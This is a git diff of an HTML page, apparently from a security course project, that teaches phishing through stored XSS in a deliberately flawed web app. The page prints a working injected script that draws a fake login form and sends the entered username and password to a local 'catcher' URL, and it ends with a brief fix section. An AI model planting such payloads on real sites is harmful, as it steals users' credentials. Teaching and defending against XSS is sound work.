@@ -1,33 +1,43 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
 <head>
-    <title>Cross Site Scripting (XSS) - Stored XSS Attack | Cyber Security Base Course Project I</title>
+    <title>Cross Site Scripting (XSS) - Phishing with XSS | Cyber Security Base Course Project I</title>
 </head>
 <body>
 <p><a href="/">Go to index page</a></p>
 <h1>Cross-Site Scripting (XSS) - Phishing with XSS</h1>
 <p>Cross-site scripting (XSS) attacks are injection type attacks that are
     used to inject malicious scripts - generally client side scripts -
-    on a web site. XSS flaws occur for when a web site dislays user supplied
-    data without proper validation and encoding. An attacker may use XSS attacks
-    to gain access to any cookies, session tokens or other sensitive information
-    that is stored in an end-users computer or even rewrite contents of a html
-    page. </p>
-<p>The flawed implementation allows users to post unchecked html and
+    in web site. XSS flaws occur when a web site dislays user supplied
+    data without proper validation and encoding.</p>
+<p>An attacker may use XSS attacks to gain access to any cookies, session
+    tokens or other sensitive information that is stored on an end-users
+    computer or rewrite contents of a html page. </p>
+<p>The flawed implementation allows users to post unchecked, unescaped html and
     javascript code in the web site's database and displays it unencoded.
     This allows an attacker to employ XSS attacks.</p>
+<p>The script below injects a login form in the page's html. The html can easily
+    be crafted so that it looks like a genuine part of the site's content.
+    An unsuspecting user may enter their credentials and sent them to an
+    external application.</p>
 
-<h2>Steps to exploit the Phishing with XSS vulnerability</h2>
+<h2>Steps to identify the vulnerability</h2>
 <ul>
     <li>
         Enter the following html in the content box and post the form<br />
-        <!--<span th:inline="none">&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;http://localhost:8090/catcher?username=&quot;+ document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen. User Name = &quot; + document.phish.user.value + &quot;, Password = &quot; + document.phish.pass.value);} &lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;H3&gt;This feature requires account login:&lt;/H3 &gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>-->
-        <span th:inline="none">&lt;/form&gt;&lt;script&gt;function sleep(delay) { var start = new Date().getTime(); while (new Date().getTime() &lt; start + delay); } function hack(){ XSSImage=new Image; XSSImage.src=&quot;http://localhost:8090/catcher?username=&quot;+ document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; sleep(1000);} &lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;H3&gt;This feature requires account login:&lt;/H3 &gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
+        <span th:inline="none" style="color: cornflowerblue; font-style: oblique;">&lt;/form&gt;&lt;script&gt;function sleep(delay) { var start = new Date().getTime(); while (new Date().getTime() &lt; start + delay); } function hack(){ XSSImage=new Image; XSSImage.src=&quot;http://localhost:8090/catcher?username=&quot;+ document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; sleep(1000);} &lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;H3&gt;This feature requires account login:&lt;/H3 &gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
     </li>
     <li>=> A form requiring credentials is displayed</li>
     <li>Enter some text in the text boxes, click submit</li>
-    <li>=> A message is displayed</li>
+    <li>=> A http request is sent, the given credentials are stored and the page is
+        refreshed. The given credentials are displayed on the bottom of the page.
+        (In a real phishing attack this functionality would of course be external)</li>
 </ul>
+
+<h2>Steps to fix the implementation</h2>
+<p>To fix the flawed implementation user-supplied data should be properly validated and
+    escaped before storing it in the application's database. This disallows
+    running malicious scripts on an end user's browser.</p>
 
 <h2>Comments</h2>
 <table>
